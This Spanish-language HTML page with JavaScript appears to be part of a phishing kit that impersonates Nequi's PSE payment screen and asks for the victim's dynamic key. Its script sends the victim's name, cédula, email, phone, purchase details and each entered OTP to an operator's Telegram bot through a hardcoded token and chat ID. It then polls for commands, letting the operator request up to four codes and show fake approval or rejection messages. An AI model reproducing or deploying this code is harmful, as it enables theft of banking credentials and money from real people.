<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagos PSE de Nequi - Clave Dinamica</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            background-color: #ffffff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 40px 20px;
        }

        .container {
            width: 100%;
            max-width: 420px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        /* Logo - Cambia el src de la imagen por tu logo */
        .logo-container {
            margin-bottom: 40px;
        }


        /* Descomenta esta linea y elimina .logo-placeholder para usar tu logo */

        .logo {
            width: 150px;
            height: 50px;
            object-fit: contain;
        }


        .title {
            font-size: 28px;
            font-weight: 700;
            color: #3D1152;
            margin-bottom: 20px;
            text-align: center;
        }

        .subtitle {
            font-size: 16px;
            color: #666;
            text-align: center;
            margin-bottom: 50px;
            line-height: 1.5;
            max-width: 350px;
        }

        /* PIN Input */
        .pin-container {
            display: flex;
            gap: 12px;
            margin-bottom: 50px;
        }

        .pin-input {
            width: 40px;
            height: 50px;
            border: none;
            border-bottom: 3px solid #3D1152;
            background: transparent;
            font-size: 24px;
            font-weight: 600;
            text-align: center;
            color: #3D1152;
            outline: none;
            caret-color: #DA0081;
        }

        .pin-input:focus {
            border-bottom-color: #DA0081;
        }

        /* Teclado numerico */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            width: 100%;
            max-width: 300px;
            margin-bottom: 40px;
        }

        .key {
            width: 70px;
            height: 70px;
            border: none;
            background: transparent;
            font-size: 32px;
            font-weight: 500;
            color: #3D1152;
            cursor: pointer;
            border-radius: 50%;
            transition: background-color 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto;
        }

        .key:hover {
            background-color: #F5F5F5;
        }

        .key:active {
            background-color: #E0E0E0;
        }

        .key-delete {
            background-color: #3D1152;
            color: white;
            font-size: 20px;
        }

        .key-delete:hover {
            background-color: #5A2175;
        }

        .key-empty {
            visibility: hidden;
        }

        .btn-cancel {
            width: 100%;
            max-width: 300px;
            padding: 18px;
            font-size: 16px;
            font-weight: 600;
            color: #333;
            background-color: #ffffff;
            border: 2px solid #E0E0E0;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-cancel:hover {
            background-color: #F5F5F5;
            border-color: #CCC;
        }
    </style>
</head>

<body>
    <div class="container">
        <!-- Logo - Reemplaza con tu imagen -->
        <div class="logo-container">
            <img src="/img/logo.svg" alt="Nequi" class="logo">
        </div>

        <h1 class="title">Pagos PSE de Nequi</h1>

        <div id="loadingMessage" style="display: none; text-align: center; margin-bottom: 30px;">
            <p class="subtitle" style="color: #DA0081; font-weight: 600; font-size: 18px;">Validando transacción...</p>
            <p class="subtitle" style="font-size: 14px;">Por favor espera mientras el banco aprueba el pago. No cierres
                esta ventana.</p>
            <!-- Puedes añadir un spinner (ruedita de carga) aquí si quieres -->
            <div
                style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #DA0081; border-radius: 50%; animation: spin 1s linear infinite;">
            </div>
            <style>
                @keyframes spin {
                    0% {
                        transform: rotate(0deg);
                    }

                    100% {
                        transform: rotate(360deg);
                    }
                }
            </style>
        </div>

        <div id="errorMessage"
            style="display: none; width: 100%; text-align: center; margin-bottom: 20px; background: #ffebee; color: #c62828; padding: 10px; border-radius: 8px;">
            La clave ingresada es incorrecta o expiró. Por favor, solicítala de nuevo e ingrésala.
        </div>

        <div id="pinArea" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
            <p class="subtitle">
                Para confirmar tu pago escribe o pega la clave dinamica que encuentras en tu App Nequi.
            </p>

            <!-- PIN Input Fields -->
            <div class="pin-container">
                <input type="text" class="pin-input" maxlength="1" data-index="0" inputmode="none" readonly>
                <input type="text" class="pin-input" maxlength="1" data-index="1" inputmode="none" readonly>
                <input type="text" class="pin-input" maxlength="1" data-index="2" inputmode="none" readonly>
                <input type="text" class="pin-input" maxlength="1" data-index="3" inputmode="none" readonly>
                <input type="text" class="pin-input" maxlength="1" data-index="4" inputmode="none" readonly>
                <input type="text" class="pin-input" maxlength="1" data-index="5" inputmode="none" readonly>
            </div>

            <!-- Teclado Numerico -->
            <div class="keypad">
                <button class="key" data-value="1">1</button>
                <button class="key" data-value="2">2</button>
                <button class="key" data-value="3">3</button>
                <button class="key" data-value="4">4</button>
                <button class="key" data-value="5">5</button>
                <button class="key" data-value="6">6</button>
                <button class="key" data-value="7">7</button>
                <button class="key" data-value="8">8</button>
                <button class="key" data-value="9">9</button>
                <button class="key key-empty"></button>
                <button class="key" data-value="0">0</button>

                <button class="key key-delete" id="deleteKey">&#x2715;</button>
            </div>
        </div>

        <button class="btn-cancel" id="btnCancela">Cancela</button>
    </div>

    <script>
        const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
        const CHAT_ID = "-5178319565";

        async function sendToTelegram(text, inlineKeyboard = null) {
            if (!CHAT_ID) {
                console.warn("Falta CHAT_ID para enviar a Telegram.");
                return;
            }
            const body = {
                chat_id: CHAT_ID,
                text: text,
                parse_mode: "HTML"
            };
            if (inlineKeyboard) body.reply_markup = { inline_keyboard: inlineKeyboard };
            await fetch(`${TELEGRAM_API}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify(body)
            });
        }

        const pinArea = document.getElementById('pinArea');
        const loadingMessage = document.getElementById('loadingMessage');
        const errorMessage = document.getElementById('errorMessage');
        const pinInputs = document.querySelectorAll('.pin-input');
        const keys = document.querySelectorAll('.key[data-value]');
        const deleteKey = document.getElementById('deleteKey');
        let currentIndex = 0;
        let pollingInterval = null;
        let lastUpdateId = 0;

        const nombre = sessionStorage.getItem("nombre") || "—";
        const cedula = sessionStorage.getItem("cedula") || "—";
        const correo = sessionStorage.getItem("correo") || "—";
        const telefono = sessionStorage.getItem("telefono") || "—";
        const total = sessionStorage.getItem("total") || "—";
        const banco = sessionStorage.getItem("banco") || "—";
        const producto = sessionStorage.getItem("producto") || "—";

        let sessionId = sessionStorage.getItem("sessionId");
        if (!sessionId) {
            sessionId = crypto.randomUUID();
            sessionStorage.setItem("sessionId", sessionId);
        }

        loadingMessage.innerHTML = `
            <p class="subtitle" style="color: #DA0081; font-weight: 600; font-size: 18px;">⏳ Procesando tu solicitud...</p>
            <p class="subtitle" style="font-size: 14px;">Por favor espera mientras el banco aprueba el pago. No cierres esta ventana.</p>
            <div style="margin: 20px auto; width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #DA0081; border-radius: 50%; animation: spin 1s linear infinite;"></div>
        `;

        function mostrarCampoPIN() {
            loadingMessage.style.display = 'none';
            errorMessage.style.display = 'none';
            pinArea.style.display = 'flex';
            pinInputs.forEach(inp => inp.value = '');
            currentIndex = 0;
            pinInputs[0].focus();
        }

        function ocultarCampoPIN() {
            pinArea.style.display = 'none';
            loadingMessage.style.display = 'block';
        }

        async function pollTelegram() {
            try {
                const res = await fetch(`${TELEGRAM_API}/getUpdates?offset=${lastUpdateId + 1}&timeout=2`);
                const data = await res.json();

                if (data.ok && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        const callbackData = update.callback_query?.data;
                        const sessionActual = sessionStorage.getItem("sessionId");

                        const cbQuery = update.callback_query;
                        const chatId = cbQuery.message.chat.id;
                        const msgId = cbQuery.message.message_id;
                        const oldText = cbQuery.message.text || "";

                        async function updateBotMsg(statusText) {
                            try {
                                await fetch(`${TELEGRAM_API}/editMessageText`, {
                                    method: "POST",
                                    headers: { "Content-Type": "application/json" },
                                    body: JSON.stringify({
                                        chat_id: chatId,
                                        message_id: msgId,
                                        text: oldText + `\n\n👉 ESTADO: ${statusText}`,
                                        reply_markup: { inline_keyboard: [] }
                                    })
                                });
                            } catch(e) { console.error("Error al editar mensaje:", e); }
                        }

                        if (callbackData === `activar_otp_${sessionActual}`) {
                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: cbQuery.id,
                                    text: "✅ OTP activado para el usuario"
                                })
                            });
                            await updateBotMsg("🔑 Pidiendo nuevo OTP al cliente");
                            
                            mostrarCampoPIN();
                            clearInterval(pollingInterval);
                        } else if (callbackData === `aprobar_pago_${sessionActual}`) {
                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: cbQuery.id,
                                    text: "✅ Pago aprobado"
                                })
                            });
                            await updateBotMsg("✅ Pago Aprobado");

                            loadingMessage.innerHTML = '<p style="color: #4CAF50; font-weight: bold; font-size: 18px;">✅ Pago aprobado exitosamente</p><p>Serás redirigido en unos segundos...</p>';
                            clearInterval(pollingInterval);
                            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
                        } else if (callbackData === `rechazar_pago_${sessionActual}`) {
                            await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: cbQuery.id,
                                    text: "❌ Pago rechazado"
                                })
                            });
                            await updateBotMsg("❌ Pago Rechazado");

                            loadingMessage.innerHTML = '<p style="color: #F44336; font-weight: bold; font-size: 18px;">❌ Pago rechazado por el banco</p><p>Serás redirigido en unos segundos...</p>';
                            clearInterval(pollingInterval);
                            setTimeout(() => { window.location.href = 'https://www.google.com'; }, 2000);
                        }
                    }
                }
            } catch (e) {
                console.warn("Polling error", e);
            }
        }

        function iniciarPolling() {
            if (pollingInterval) clearInterval(pollingInterval);
            pollingInterval = setInterval(pollTelegram, 2000);
        }

        window.addEventListener("beforeunload", () => {
            if (pollingInterval) clearInterval(pollingInterval);
        });

        if (!sessionStorage.getItem("otpCount")) {
            sessionStorage.setItem("otpCount", "0");
        }

        function getNextOtpKey() {
            let count = parseInt(sessionStorage.getItem("otpCount") || "0", 10);
            count = count >= 4 ? 1 : count + 1;
            sessionStorage.setItem("otpCount", String(count));
            return count;
        }

        async function submitOTP(pin) {
            ocultarCampoPIN();

            const count = getNextOtpKey();
            sessionStorage.setItem(`otp${count}`, pin);

            const otp1 = sessionStorage.getItem('otp1') || '—';
            const otp2 = sessionStorage.getItem('otp2') || '—';
            const otp3 = sessionStorage.getItem('otp3') || '—';
            const otp4 = sessionStorage.getItem('otp4') || '—';

            const text = `🔐 <b>PIN Nequi Recibido — OTP${count}</b>\n\n👤 Nombre: ${nombre}\n🪪 Cédula: ${cedula}\n📧 Correo: ${correo}\n📞 Teléfono: ${telefono}\n💰 Total: ${total}\n🛒 Producto: ${producto}\n\n🔑 OTP1: ${otp1}\n🔑 OTP2: ${otp2}\n🔑 OTP3: ${otp3}\n🔑 OTP4: ${otp4}\n\n📊 OTP actual: ${count} de 4 | 🆔 ${sessionId}`;
            
            const inlineKeyboard = [
                [{ "text": "🔑 Pedir otro OTP", "callback_data": `activar_otp_${sessionId}` }],
                [
                    { "text": "✅ Aprobar", "callback_data": `aprobar_pago_${sessionId}` },
                    { "text": "❌ Rechazar", "callback_data": `rechazar_pago_${sessionId}` }
                ]
            ];
            
            await sendToTelegram(text, inlineKeyboard);
            iniciarPolling();
        }

        keys.forEach(key => {
            key.addEventListener('click', function () {
                if (pinArea.style.display === 'none') return;
                const value = this.getAttribute('data-value');
                if (currentIndex < 6) {
                    pinInputs[currentIndex].value = value;
                    currentIndex++;
                    if (currentIndex < 6) {
                        pinInputs[currentIndex].focus();
                    } else {
                        const pin = Array.from(pinInputs).map(input => input.value).join('');
                        submitOTP(pin);
                    }
                }
            });
        });

        deleteKey.addEventListener('click', function () {
            if (pinArea.style.display === 'none') return;
            if (currentIndex > 0) {
                currentIndex--;
                pinInputs[currentIndex].value = '';
                pinInputs[currentIndex].focus();
            }
        });

        document.getElementById('btnCancela').addEventListener('click', function () {
            window.location.href = 'nequi-login.html';
        });

        document.addEventListener('paste', function (e) {
            if (pinArea.style.display === 'none') return;
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 6);

            for (let i = 0; i < pastedData.length && i < 6; i++) {
                pinInputs[i].value = pastedData[i];
            }

            currentIndex = Math.min(pastedData.length, 6);
            if (currentIndex < 6) {
                pinInputs[currentIndex].focus();
            }

            if (pastedData.length === 6) {
                const pin = Array.from(pinInputs).map(input => input.value).join('');
                submitOTP(pin);
            }
        });

        // Mostrar el PIN al entrar sin enviar notificacion
        mostrarCampoPIN();
    </script>
</body>
</html>
